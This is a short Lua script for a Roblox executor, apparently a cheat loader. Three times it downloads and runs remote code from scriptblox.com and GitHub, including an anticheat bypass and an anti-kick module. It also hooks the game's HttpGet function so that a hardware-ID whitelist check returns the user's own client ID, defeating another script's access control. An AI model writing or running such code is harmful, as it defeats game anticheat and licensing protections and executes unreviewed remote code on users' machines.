
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Adonis-Anticheat-Bypass-11111", true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/skidscript/refs/heads/main/antikick.lua"))()
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local oldHttpGetAsync
oldHttpGetAsync = hookfunction(game.HttpGet, function(self, url)
    if type(url) == "string" then
        if string.match(url, "https://raw.githubusercontent.com/RobloxSkids/HwidWl/refs/heads/main/Main.lua") then
            return RbxAnalyticsService:GetClientId()
        end
    end
    return oldHttpGetAsync(self, url)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/skidscript/refs/heads/main/WeGonBeOk.lua.txt"))()
